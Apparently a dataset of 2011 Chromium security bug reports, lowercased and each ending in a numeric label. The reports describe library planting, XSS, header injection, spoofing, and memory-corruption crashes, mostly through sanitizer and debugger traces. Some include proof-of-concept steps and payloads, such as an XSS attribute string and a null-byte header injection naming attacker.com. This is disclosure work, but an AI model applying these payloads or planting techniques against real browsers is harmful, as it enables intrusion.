load the library specified in it whle this scenario still relies on user interaction it can be improved if the malicious page manages to bypass the multiple downloads warning it can fairly quickly download a 100 of dummy files with the same name which is the amount where chrome automatically opens a save as dialog after the 100th download the malicious page can with a decent acuracy trigger the https request thereby causing the loading of malicious pkcs11.txt and malicious library without any user interaction it might be difficult to hide such multiple downloads shower from the user but if the user has left chrome open overnight the attack could take place at 4am without anyone noticing version chrome version 14.0.835.186 m operating system windows xp sp3 updated on 9/21/2011 windows 7 sp1 updated on 9/21/2011 reproduction case 1 make sure google is not your selected search engine if it is change it to yahoo or bing under options basics then restart chrome and open this page again 2 make sure you have not visited any https pages before performing this test if in doubt restart chrome and open this page again 3 make sure you have files pkcs11.txt and malicious.lib from the attached zip archive stored in the root of an accessible shared folder such as in server\sharename and not for instance in server\sharename\subfolder 4 get ready to quickly type the above shared folder s path e.g server\sharename or if you do n't want to type quickly copy it to your clipboard 5 open pkcs11planting_poc.html either from a local drive or a web server then click the choose file button it displays 6 type the shared folder s path into the name field of the open dialog or paste it if you previously copied it to the clipboard and press open then keep the open dialog open 7 when the countdown reaches 0 a hacked dialog will pop up	7
memory corruption in angle shader translator build and run chromium in windows on top of angle goto in release mode conformance/glsl/glsl-feature-atan-xy.html fails with a bunch of weird errors in debug mode conformance/glsl/glsl-feature-atan-xy.html triggers a bunch of assert 0 poolalloc damage in guard block from compiler/poolalloc.cpp:162 it seems like this corruption is triggered by built-in function emulation however i am not sure the bug is actually in the emulation code it s likely the emulation code just exposed a bug	11
security location bar spoofing using very long string on a web address in the location bar vulnerability details when a webpage try to go on a website that contain very long string in the address location location bar is spoofed view screenshot version chrome version 14.0.794.0 stable beta or dev operating system windows 7 reproduction case view testcase1 and tescase2 jordi chancel	9
prevent silent truncation of trailing characters in downloaded file names vulnerability details the attached file wo n't prompt you the typical this file can potentially damage your computer version chrome version 14.0.825.0 dev-m operating system windows 7 also works on windows xp reproduction case click the attached file see bug/5067277 credit/reward should be given to marc.novak gmail.com	9
xss in chrome appcache-internals there is an xss hole in the chrome appcache-internals page due to incorrect escaping of user input prior to display vulnerability details the vulnerability is possible when a known application has been installed the example shown here is specific to angry birds but there is a corresponding vector for any app which is consistent across all installations of the app version chrome version 14.0.835 beta operating system presumably all tested on linux 64 this was likely introduced at r92263 reproduction case install angry birds from the app store lanuch angry birds in a new tab type into the location bar chrome appcache-internals view-cache=ahr0cdovl2nocm9tzs5hbmdyewjpcmrzlmnvbs9tyw5pzmvzdc9mb3dslm1hbmlmzxn0 onmouseover=alert 0 page source contains a href=chrome appcache-internals view-entry=ahr0cdovl2nocm9tzs5hbmdyewjpcmrzlmnvbs9tyw5pzmvzdc9mb3dslm1hbmlmzxn0|ahr0cdovl2nocm9tzs5hbmdyewjpcmrzlmnvbs8=|1409 onmouseover=alert 0 mousing over links triggers js execution	9
security jsc yarr regexp 32/48 to the left of 768 with workers vulnerability details the repro itself is rather large and it contains a lot of repetition inside a lot of repetition and it takes a lot of tries to repro it but it does happen over and over with this file and not with others repro.html is the main file and the others are the stock files from the chromium/webkit automated tests it only works with the http schema for me maybe because there are no workers in the file schema the filesystem api is not needed for this because it says in the output div worker this test requires filesystem api got error from worker uncaught referenceerror requestfilesystem is not defined version chromium 15.0.864.0 developer build 98444-dirty os linux webkit 535.2 trunk 93707 javascript v8 3.5.8 64bit linux reproduction case attached for crashes please include the following additional information type of crash worker thread sad tab 12910 error addresssanitizer crashed on address at pc bp sp read of size 4 at thread t96 0 in jsc yarr interpreter matchdisjunction jsc yarr bytedisjunction jsc yarr interpreter disjunctioncontext bool 0 1 in jsc yarr interpreter interpret 0 2 in jsc yarr interpret jsc yarr bytecodepattern unsigned short const unsigned int unsigned int is located 48 bytes to the left of 768-byte region allocated by thread t0 here 0 in malloc asan_rtl 1 in wtf fastmalloc unsigned long 0 2 in wtf vector jsc yarr byteterm 0ul reservecapacity unsigned long 0 3 in jsc yarr bytecompiler regexbegin unsigned int unsigned int bool 0 4 in jsc yarr bytecompiler compile wtf bumppointerallocator 0	11
redirect to chrome uris via location header vulnerability details usually google chrome do n't allow redirect to chrome uris for example meta http-equiv refresh content 0 url=chrome about and script location.href chrome about script do n't redirect but location header is different i could redirect to chrome about via following header location chrome about i think this behavior is bad version chrome version 13.0.782.220 stable operating system windows vista sp2	2
security header injection when using embeded 0 in headerline vulnerability details chrome provide undocumented character as a delimiter in http response version chrome version 13.0.782.220 stable operating system all reproduction case 1 run serv.pl 2 open 3 look at tcpdump headers cookies details sec6 after receiving and interpreting a request message a server responds with an http response message response status-line section 6.1 general-header section 4.5 response-header section 6.2 entity-header crlf section 7.1 crlf message-body section 7.2 but 00 is also work then attacker can bypass wep application filters like this location str_replace r location location str_replace n location location=/private-data.html 00access-control-allow-origin 20attacker.com location private-data.html access-control-allow-origin attacker.com other browsers are not vulnerable	9
use after free in media bufferedresourceloader start found in my fuzzing asan clusterfuzz bot cluster_fuzz_422 on platform linux revision 100523 webkit revision 94856 testcase was a one time crasher so looks like this is a timing related issue but asan has a free stack which looks to tell that the resource loader is already freed this does not look to be drt specific since i see this a lot on the crash reports too e.g mnt/scratch0/chrome/src/out/release/dumprendertree asan sigill hint if your stack trace looks short or garbled use asan_options=fast_unwind=0 18890 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webkit_glue bufferedresourceloader start callbackrunner tuple1 int callbackrunner tuple0 webkit webframe 1 in webkit_glue buffereddatasource initializetask 2 in base subtle taskclosureadapter run 3 in messageloop runtask messageloop pendingtask const 4 in messageloop deferorrunpendingtask messageloop pendingtask const 5 in messageloop dowork 6 in anonymous namespace worksourcedispatch gsource int void void base/message_pump_glib.cc:0 7 in g_main_dispatch build/buildd/glib2.0-2.24.1/glib/gmain.c:1960 8 in g_main_context_iterate build/buildd/glib2.0-2.24.1/glib/gmain.c:2591 9 in ia__g_main_context_iteration build/buildd/glib2.0-2.24.1/glib/gmain.c:2654 10 in base messagepumpgtk runonce gmaincontext bool 11 in base messagepumpglib runwithdispatcher base messagepump delegate base messagepumpdispatcher 12 in messageloop runinternal 13 in messageloop run 14 in testshell waittestfinished 15 in testshell runfiletest testparams const 16 in runtest testshell testparams std basic_string char std char_traits char std allocator char const bool third_party/webkit/tools/dumprendertree/chromium/dumprendertree.cpp:0 17 in main 18 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 19 in start is located 0 bytes inside of 392-byte region freed by thread t0 here 1 in webcore frameloader frameloader 2 in webcore frame frame 3 in webcore frameview frameview 4 in webcore frameview frameview 5 in webcore renderwidget resumewidgethierarchyupdates 6 in webcore element detach 7 in webcore containernode removechild webcore node int 8 in webcore node removechild webcore node int 9 in webcore v8node removechildcallback v8 arguments const 10 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 11 in 12 in 13 in 14 in 15 in 16 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal object bool v8/src/execution.cc:0 17 in v8 script run 18 in webcore v8proxy runscript v8 handle v8 script bool 19 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node 20 in webcore scheduledaction execute webcore v8proxy 21 in webcore domtimer fired 22 in webcore threadtimers sharedtimerfiredinternal 23 in base subtle taskclosureadapter run 24 in messageloop runtask messageloop pendingtask const 25 in messageloop deferorrunpendingtask messageloop pendingtask const 26 in messageloop dowork 27 in base messagepumpglib runwithdispatcher base messagepump delegate base messagepumpdispatcher 28 in messageloop runinternal 29 in messageloop run previously allocated by thread t0 here 1 in wtf fastmalloc unsigned long 2 in webkit webframeimpl createchildframe webcore frameloadrequest const webcore htmlframeownerelement 3 in webkit frameloaderclientimpl createframe webcore kurl const wtf string const webcore htmlframeownerelement wtf string const bool int int 4 in webcore subframeloader loadsubframe webcore htmlframeownerelement webcore kurl const wtf string const wtf string const 5 in webcore subframeloader loadorredirectsubframe webcore htmlframeownerelement webcore kurl const wtf atomicstring const bool bool 6 in webcore subframeloader requestframe webcore htmlframeownerelement wtf string const wtf atomicstring const bool bool 7 in webcore htmlframeelementbase openurl bool bool 8 in webcore containernode parseraddchild wtf passrefptr webcore node 9 in wtf passrefptr webcore element webcore htmlconstructionsite attach webcore element webcore containernode wtf passrefptr webcore element 10 in webcore htmlconstructionsite inserthtmlelement webcore atomichtmltoken 11 in webcore htmltreebuilder processstarttagforinbody webcore atomichtmltoken 12 in webcore htmltreebuilder processstarttag webcore atomichtmltoken 13 in webcore htmltreebuilder processtoken webcore atomichtmltoken 14 in webcore htmltreebuilder constructtreefromatomictoken webcore atomichtmltoken 15 in webcore htmltreebuilder constructtreefromtoken webcore htmltoken 16 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 17 in webcore htmldocumentparser resumeparsingafterscriptexecution 18 in webcore htmldocumentparser notifyfinished webcore cachedresource 19 in webcore cachedresource checknotify 20 in webcore cachedresourcerequest didfinishloading webcore subresourceloader double 21 in webcore subresourceloader didfinishloading double 22 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const 23 in anonymous namespace requestproxy notifycompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const webkit/tools/test_shell/simple_resource_loader_bridge.cc:0 18890 aborting shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd base debug stacktrace stacktrace base anonymous namespace stackdumpsignalhandler asan_report_error webkit_glue bufferedresourceloader start webkit_glue buffereddatasource initializetask base subtle taskclosureadapter run messageloop runtask messageloop deferorrunpendingtask messageloop dowork anonymous namespace worksourcedispatch base messagepumpgtk runonce base messagepumpglib runwithdispatcher messageloop runinternal messageloop run testshell waittestfinished testshell runfiletest runtest main	11
use-after-free in findplaceforcounter vulnerability details use-after-free with counters 32 inside 72 version chrome version chromium 16.0.884.0 developer build 101535-dirty os linux webkit 535.4 trunk 95290 javascript v8 3.6.4 operating system linux 64bit reproduction case attached for crashes please include the following additional information type of crash renderer asan/vg crash state error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore findplaceforcounter webcore renderobject wtf atomicstring const bool webcore counternode webcore counternode third_party/webkit/source/webcore/rendering/rendercounter.cpp:0 1 in webcore makecounternode webcore renderobject wtf atomicstring const bool third_party/webkit/source/webcore/rendering/rendercounter.cpp:0 is located 32 bytes inside of 72-byte region freed by thread t0 here 0 in free asan_rtl 1 in wtf hashtable wtf refptr wtf atomicstringimpl std pair wtf refptr wtf atomicstringimpl wtf refptr webcore counternode	11
crashes in phishingdomfeatureextractor extractfeatureswithtimeout there are crashes showing up on all platforms in phishingdomfeatureextractor extractfeatueswithtimeout an example report is chrome_mac 14.0.835.163 thread 0 crashed exc_bad_access kern_invalid_address google chrome framework phishing_dom_feature_extractor.cc:157 safe_browsing phishingdomfeatureextractor extractfeatureswithtimeout google chrome framework message_loop.cc:104 taskclosureadapter run google chrome framework base/callback.h:265 messageloop runtask google chrome framework message_loop.cc:502 messageloop dowork google chrome framework message_pump_mac.mm:258 base messagepumpcfrunloopbase runwork corefoundation cfrunlooprunspecific corefoundation cfrunloopruninmode hitoolbox runcurrenteventloopinmode hitoolbox receivenexteventcommon hitoolbox blockuntilnexteventmatchinglistinmode appkit dpsnextevent appkit nsapplication nexteventmatchingmask untildate inmode dequeue appkit nsapplication run google chrome framework message_pump_mac.mm:554 base messagepumpnsapplication dorun google chrome framework message_pump_mac.mm:175 base messagepumpcfrunloopbase run google chrome framework message_loop.cc:451 messageloop run google chrome framework renderer_main.cc:228 renderermain google chrome framework chrome_main.cc:552 chromemain google chrome helper chrome_exe_main_mac.cc:16 main google chrome helper start current guess is that we are accessing a deleted webframe through cur_frame	9
use-after-free with plugin and editing vulnerability details this requires the test plugin and cleardocumentduringnew but here goes version chrome version chromium 16.0.901.0 developer build 103965 os linux webkit 535.6 trunk 96574 javascript v8 3.6.4.1 operating system 64 bit linux reproduction case attached for crashes please include the following additional information type of crash renderer crash state 32223 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in webcore visibleposition canonicalposition webcore position const 0 1 in webcore visibleposition init webcore position const webcore eaffinity 0 2 in webcore domselection setposition webcore node int int 0 3 in webcore domselectioninternal setpositioncallback v8 arguments const out/release/obj/gen/webkit/bindings/v8derivedsources19.cpp:0 4 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 5 in is located 72 bytes inside of 120-byte region freed by thread t0 here 0 in operator delete void asan_rtl 1 in webcore containernode removechildren 0 2 in webcore replacechildrenwithfragment webcore htmlelement wtf passrefptr webcore documentfragment int third_party/webkit/source/webcore/html/htmlelement.cpp:0	11
heap buffer overflow in webaudio fftframe dofft vulnerability details buffer overflow version chrome version stable trunk operating system linux 64bit reproduction case data text/html script new webkitaudiocontext 1 1 22050 script higher third parameter makes allocation larger first parameter can go up to 10 second parameter can go up to third parameter for crashes please include the following additional information type of crash tab crash state 6220 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t5 0 in webcore fftframe dofft float 0 1 in webcore hrtfkernel hrtfkernel webcore audiochannel unsigned long double bool 0 is located 1 bytes to the left of 512-byte region allocated by thread t5 here 0 in malloc asan_rtl 1 in wtf fastmalloc unsigned long 0 2 in webcore audioarray float allocate unsigned long 0 warning set address range perms large range noaccess thread 6 invalid read of size 8 at memcpy mc_replace_strmem.c:635 by webcore fftframe dofft float by webcore extractaveragegroupdelay webcore audiochannel unsigned long address is 40 bytes before a block of size 512 alloc d at malloc vg_replace_malloc.c:904 by wtf fastmalloc unsigned long by webcore audiobus audiobus unsigned int unsigned long bool address is not stack d malloc d or recently free d process terminating with default action of signal 11 sigsegv general protection fault at memcpy mc_replace_strmem.c:635 by webcore fftframe dofft float	11
repeatedly re-setting video.src crashes in webcore videolayerchromium updatecompositorresources setting video.src at an unlucky point during initialization/playback causes a crash it used to cause a hang but that was fixed as r104542 exposing this crash load this snippet in the browser wait for a few reloads and watch the aw snap page come up html script function setsrc document.getelementbyid video src settimeout setsrc math.random 1000 script body onload setsrc video id video autoplay controls video body html debugging the dropped core we see the segv in thread 1 below program terminated with signal 11 segmentation fault 0 in webcore videolayerchromium updatecompositorresources this context allocator at third_party/webkit/source/webcore/platform/graphics/chromium/videolayerchromium.cpp:102 102 videoframechromium frame m_provider getcurrentframe gdb thread apply all bt thread 5 thread 25269 0 pthread_cond_wait glibc_2.3.2 at nptl/sysdeps/unix/sysv/linux/x86_64/pthread_cond_wait.s:162 1 in base conditionvariable wait this at base/synchronization/condition_variable_posix.cc:35 2 in base waitableevent timedwait this max_time at base/synchronization/waitable_event_posix.cc:206 3 in base waitableevent wait this at base/synchronization/waitable_event_posix.cc:153 4 in base messagepumpdefault run this delegate at base/message_pump_default.cc:42 5 in messageloop runinternal this at base/message_loop.cc:444 6 in messageloop runhandler this at base/message_loop.cc:417 7 in messageloop run this at base/message_loop.cc:341 8 in base thread run this message_loop at base/threading/thread.cc:128 9 in base thread threadmain this at base/threading/thread.cc:163 10 in base anonymous namespace threadfunc params at base/threading/platform_thread_posix.cc:54 11 in start_thread arg value optimized out at pthread_create.c:300 12 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 13 in thread 4 thread 25266 0 pthread_cond_wait glibc_2.3.2 at nptl/sysdeps/unix/sysv/linux/x86_64/pthread_cond_wait.s:162 1 in base conditionvariable wait this at base/synchronization/condition_variable_posix.cc:35 2 in base waitableevent timedwait this max_time at base/synchronization/waitable_event_posix.cc:206 3 in base waitableevent wait this at base/synchronization/waitable_event_posix.cc:153 4 in base messagepumpdefault run this delegate at base/message_pump_default.cc:42 5 in messageloop runinternal this at base/message_loop.cc:444 6 in messageloop runhandler this at base/message_loop.cc:417 7 in messageloop run this at base/message_loop.cc:341 8 in base thread run this message_loop at base/threading/thread.cc:128 9 in base thread threadmain this at base/threading/thread.cc:163 10 in base anonymous namespace threadfunc params at base/threading/platform_thread_posix.cc:54 11 in start_thread arg value optimized out at pthread_create.c:300 12 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 13 in thread 3 thread 25265 0 syscall at sysdeps/unix/sysv/linux/x86_64/syscall.s:39 1 in epoll_wait epfd=13 events maxevents=32 timeout=-1 at third_party/libevent/epoll_sub.c:51 2 in epoll_dispatch base arg tv at third_party/libevent/epoll.c:198 3 in event_base_loop base flags=1 at third_party/libevent/event.c:516 4 in base messagepumplibevent run this delegate at base/message_pump_libevent.cc:260 5 in messageloop runinternal this at base/message_loop.cc:444 6 in messageloop runhandler this at base/message_loop.cc:417 7 in messageloop run this at base/message_loop.cc:341 8 in base thread run this message_loop at base/threading/thread.cc:128 9 in base thread threadmain this at base/threading/thread.cc:163 10 in base anonymous namespace threadfunc params at base/threading/platform_thread_posix.cc:54 11 in start_thread arg value optimized out at pthread_create.c:300 12 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 13 in thread 2 thread 25268 0 sem_wait at nptl/sysdeps/unix/sysv/linux/x86_64/sem_wait.s:86 1 in v8 internal linuxsemaphore wait this at v8/src/platform-linux.cc:803 2 in v8 internal runtimeprofiler waitforsomeisolatetoenterjs at v8/src/runtime-profiler.cc:311 3 in v8 internal runtimeprofilerratelimiter suspendifnecessary this at v8/src/runtime-profiler.cc:357 4 in v8 internal signalsender run this at v8/src/platform-linux.cc:1028 5 in v8 internal threadentry arg at v8/src/platform-linux.cc:680 6 in start_thread arg value optimized out at pthread_create.c:300 7 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 8 in thread 1 thread 25264 0 in webcore videolayerchromium updatecompositorresources this context allocator at third_party/webkit/source/webcore/platform/graphics/chromium/videolayerchromium.cpp:102 1 in webcore cclayertreehost updatecompositorresources this layer context allocator at third_party/webkit/source/webcore/platform/graphics/chromium/cc/cclayertreehost.cpp:397 2 in webcore cclayertreehost updatecompositorresources this rendersurfacelayerlist context allocator at third_party/webkit/source/webcore/platform/graphics/chromium/cc/cclayertreehost.cpp:378 3 in webcore cclayertreehost committoonccthread this hostimpl at third_party/webkit/source/webcore/platform/graphics/chromium/cc/cclayertreehost.cpp:128 4 in webcore ccsinglethreadproxy commitifneeded this at third_party/webkit/source/webcore/platform/graphics/chromium/cc/ccsinglethreadproxy.cpp:251 5 in webcore ccsinglethreadproxy compositeimmediately this at third_party/webkit/source/webcore/platform/graphics/chromium/cc/ccsinglethreadproxy.cpp:192 6 in webcore cclayertreehost composite this at third_party/webkit/source/webcore/platform/graphics/chromium/cc/cclayertreehost.cpp:246 7 in webkit webviewimpl composite this at third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1171 8 in renderwidget dodeferredupdate this at content/renderer/render_widget.cc:810 9 in renderwidget dodeferredupdateandsendinputack this at content/renderer/render_widget.cc:678 10 in renderwidget onupdaterectack this at content/renderer/render_widget.cc:366 11 in ipc dispatch msg obj sender func at usr/local/google/fischman/src/chromium/src/ninja/debug ipc/ipc_message.h:137 12 in renderwidget onmessagereceived this message at content/renderer/render_widget.cc:195 13 in renderview onmessagereceived this message at content/renderer/render_view.cc:694 14 in messagerouter routemessage this msg at content/common/message_router.cc:46 15 in messagerouter onmessagereceived this msg at content/common/message_router.cc:38 16 in childthread onmessagereceived this msg at content/common/child_thread.cc:169 17 in ipc channelproxy context ondispatchmessage ipc message const 18 in dispatchtomethod obj method arg at usr/local/google/fischman/src/chromium/src/ninja/debug base/tuple.h:547 19 in runnablemethod ipc channelproxy context void ipc channelproxy context ipc message const tuple1 ipc message run this at usr/local/google/fischman/src/chromium/src/ninja/debug base/task.h:349 20 in base subtle taskclosureadapter run this at base/task.cc:71 21 in base internal invoker1 false base internal invokerstorage1 void base subtle taskclosureadapter base subtle taskclosureadapter void base subtle taskclosureadapter doinvoke base at usr/local/google/fischman/src/chromium/src/ninja/debug base/bind_internal.h:596 22 in base callback void run void const this at usr/local/google/fischman/src/chromium/src/ninja/debug base/callback.h:269 23 in messageloop runtask this pending_task at base/message_loop.cc:481 24 in messageloop deferorrunpendingtask this pending_task at base/message_loop.cc:497 25 in messageloop dowork this at base/message_loop.cc:687 26 in base messagepumpdefault run this delegate at base/message_pump_default.cc:23 27 in messageloop runinternal this at base/message_loop.cc:444 28 in messageloop runhandler this at base/message_loop.cc:417 29 in messageloop run this at base/message_loop.cc:341 30 in renderermain parameters at content/renderer/renderer_main.cc:228 31 in anonymous namespace runzygote main_function_params delegate at content/app/content_main.cc:222 32 in anonymous namespace runnamedprocesstypemain process_type main_function_params delegate at content/app/content_main.cc:259 33 in content contentmain argc=2 argv delegate at content/app/content_main.cc:442 34 in chromemain argc=2 argv at chrome/app/chrome_main.cc:32 35 in main argc=2 argv at chrome/app/chrome_exe_main_gtk.cc:18 this is on a z600/glucid 16.0.904.0 developer build 104560-dirty	11
oob read in ogv at unpack_vlcs vulnerability details asan reports a global-buffer-overflow when the attached ogv video is played i have n't yet had a look if it seems to have security impact but filing conservatively as a security bug version chrome version chromium 16.0.910.0 developer build 105656 operating system linux debian 6.0.3 x84_64 reproduction case chrome oobr.ogv for crashes please include the following additional information type of crash tab crash state program received signal sigill illegal instruction switching to thread lwp 5305 unpack_vlcs s optimized out gb=unhandled dwarf expression opcode at third_party/ffmpeg/patched-ffmpeg/libavcodec/vp3.c:899 899 eob_run eob_run_base token gdb list 894 while coeff_i num_coeffs get_bits_left gb 0 895 decode a vlc into a token 896 token get_vlc2 gb vlc_table 11 3 897 use the token to get a zero run a coefficient and an eob run 898 if token 6 899 eob_run eob_run_base token 900 if eob_run_get_bits token 901 eob_run get_bits gb eob_run_get_bits token 902 903 record only the number of blocks ended in this plane gdb bt 5 0 unpack_vlcs s optimized out gb=unhandled dwarf expression opcode at third_party/ffmpeg/patched-ffmpeg/libavcodec/vp3.c:899 1 in unpack_dct_coeffs s optimized out gb optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vp3.c:1042 2 vp3_decode_frame avctx optimized out data optimized out data_size optimized out avpkt optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vp3.c:1952 3 in avcodec_decode_video2 avctx optimized out picture optimized out got_picture_ptr optimized out avpkt optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/utils.c:769 4 in media ffmpegvideodecodeengine decodeframe this optimized out buffer=dwarf-2 expression error dw_op_reg operations must be used either alone or in conjuction with dw_op_piece or dw_op_bit_piece at media/video/ffmpeg_video_decode_engine.cc:181 more stack frames follow 19248 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t7 0 home/aki/chromium/src/out/release/libffmpegsumo.so 1 home/aki/chromium/src/out/release/libffmpegsumo.so 2 home/aki/chromium/src/out/release/libffmpegsumo.so 3 home/aki/chromium/src/out/release/chrome 4 home/aki/chromium/src/out/release/chrome 5 home/aki/chromium/src/out/release/chrome 6 home/aki/chromium/src/out/release/chrome 7 home/aki/chromium/src/out/release/chrome 8 home/aki/chromium/src/out/release/chrome 9 home/aki/chromium/src/out/release/chrome 10 home/aki/chromium/src/out/release/chrome 11 home/aki/chromium/src/out/release/chrome 12 home/aki/chromium/src/out/release/chrome 13 home/aki/chromium/src/out/release/chrome 14 home/aki/chromium/src/out/release/chrome 15 home/aki/chromium/src/out/release/chrome 16 lib/libpthread-2.11.2.so 17 lib/libc-2.11.2.so is located 49 bytes to the right of global variable str18 of size 43 str18 is ascii string invalid number of coefficents at level d is located 4 bytes to the left of global variable eob_run_base of size 28 eob_run_base is ascii string 01	11
use after free in webm/matroska at matroska_execute_seekhead vulnerability details asan reports a use-after-free when the attached video is played reporting as a security vulnerability based on bug type the cause might be the same as in issue 100464 but reporting separately since the crash traces do n't seem to have anything in common version chrome version chromium 16.0.910.0 developer build 105656 operating system linux debian 6.0.3 x84_64 reproduction case chrome uaf-matroska.webm for crashes please include the following additional information type of crash tab crash state i would have symbolized the asan trace but that seems to require more memory than i have available so i aborted the attempt after some rather heavy swapping sorry about that program received signal sigill illegal instruction switching to thread lwp 30309 matroska_execute_seekhead matroska optimized out at third_party/ffmpeg/patched-ffmpeg/libavformat/matroskadec.c:1254 1254 if seekhead i pos before_pos gdb list 1249 if matroska ctx pb seekable 1250 matroska ctx flags avfmt_flag_ignidx 1251 return 1252 1253 for i 0 i seekhead_list nb_elem i 1254 if seekhead i pos before_pos 1255 continue 1256 1257 defer cues parsing until we actually need cue data 1258 if seekhead i id matroska_id_cues gdb bt 5 0 matroska_execute_seekhead matroska optimized out at third_party/ffmpeg/patched-ffmpeg/libavformat/matroskadec.c:1254 1 matroska_read_header s optimized out ap optimized out at third_party/ffmpeg/patched-ffmpeg/libavformat/matroskadec.c:1373 2 in avformat_open_input ps optimized out filename optimized out fmt optimized out options optimized out at third_party/ffmpeg/patched-ffmpeg/libavformat/utils.c:668 3 in av_open_input_file ic_ptr optimized out filename=unhandled dwarf expression opcode at third_party/ffmpeg/patched-ffmpeg/libavformat/utils.c:583 4 in media ffmpegdemuxer initializetask media datasource base callback void media pipelinestatus const this optimized out data_source optimized out callback optimized out at media/filters/ffmpeg_demuxer.cc:459 more stack frames follow 30377 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t19 0 home/aki/chromium/src/out/release/libffmpegsumo.so 1 home/aki/chromium/src/out/release/libffmpegsumo.so	11
oob read in webm/vorbis at render_line vulnerability details asan reports a global-buffer-overflow when the attached video is played probably worth checking if there is any useful control and range in it version chrome version 16.0.911.10 dev operating system linux reproduction case chrome oobr-vorbis.webm for crashes please include the following additional information type of crash tab crash state program received signal sigill illegal instruction switching to thread lwp 31404 render_line x0 optimized out y0 optimized out x1 optimized out y1 optimized out buf optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbis.c:198 198 buf x ff_vorbis_floor1_inverse_db_table y gdb list 193 err ady 194 if err 0 195 err adx 196 y sy 197 198 buf x ff_vorbis_floor1_inverse_db_table y 199 200 201 202 gdb bt 5 0 render_line x0 optimized out y0 optimized out x1 optimized out y1 optimized out buf optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbis.c:198 1 in ff_vorbis_floor1_render_list list optimized out values optimized out y_list optimized out flag optimized out multiplier optimized out out optimized out samples optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbis.c:216 2 in vorbis_floor1_decode vc optimized out vfu optimized out vec optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbisdec.c:1259 3 in vorbis_parse_audio_packet vc optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbisdec.c:1507 4 vorbis_decode_frame avccontext optimized out data optimized out data_size optimized out avpkt optimized out at third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbisdec.c:1620 more stack frames follow no symbols again due to slowness of swapping via usb2 asan sigill 31470 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t6 0 home/aki/chromium/src/out/release/libffmpegsumo.so 1 home/aki/chromium/src/out/release/libffmpegsumo.so 2 home/aki/chromium/src/out/release/libffmpegsumo.so 3 home/aki/chromium/src/out/release/libffmpegsumo.so 4 home/aki/chromium/src/out/release/libffmpegsumo.so 5 home/aki/chromium/src/out/release/chrome 6 home/aki/chromium/src/out/release/chrome 7 home/aki/chromium/src/out/release/chrome 8 home/aki/chromium/src/out/release/chrome 9 home/aki/chromium/src/out/release/chrome 10 home/aki/chromium/src/out/release/chrome 11 home/aki/chromium/src/out/release/chrome 12 home/aki/chromium/src/out/release/chrome 13 home/aki/chromium/src/out/release/chrome 14 home/aki/chromium/src/out/release/chrome 15 home/aki/chromium/src/out/release/chrome 16 lib/libpthread-2.11.2.so 17 lib/libc-2.11.2.so is located 0 bytes to the right of global variable ff_vorbis_floor1_inverse_db_table of size 1024 31470 aborting shadow byte and word f9 f9 f9 f9 f9 00 00 00 00 more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00	11
seeking on webm 1080p video causes crash what steps will reproduce the problem 1.play 1080p webm video 2.move scrubber to seek forward and then back 3 what is the expected output what do you see instead browser crashes expected is that seeking should not cause browser to crash please use labels and text to provide additional information so far only repros on linux w/beta 15.0.874.100	11
oob read in webm/vorbis vorbis_decode_frame vulnerability details asan reports an heap buffer overflow read when the attached video is played in chromium the read is 384 past the end of an object this appears to also affect the stable version where the renderer often crashes with a general protection error version chrome version 17.0.918.0 dev also stable operating system linux debian 6.0.3 x86_64 reproduction case chrome oobr-vorbis-2.webm for crashes please include the following additional information type of crash tab crash state i do n't have enough memory to symbolize asan traces with full debugging data but thanks to a tip form kcc at least the symbols are here 26270 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t92 0 in vorbis_decode_frame third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbisdec.c:0 1 in avcodec_decode_audio3 0 2 in zn5media18ffmpegaudiodecoder14dodecodebuffererk13scoped_refptrins_6bufferee sysinfo.cc:0 3 in zn4base8internal8invoker2ilb0ens0_15invokerstorage2imn5media18ffmpegaudiodecoderefvrk13scoped_refptrins3_6buffereeeps4_s7_eesb_e8doinvokeepns0_18invokerstoragebasee sysinfo.cc:0 4 in zn11messageloop7runtaskerkns_11pendingtaske sysinfo.cc:0 5 in 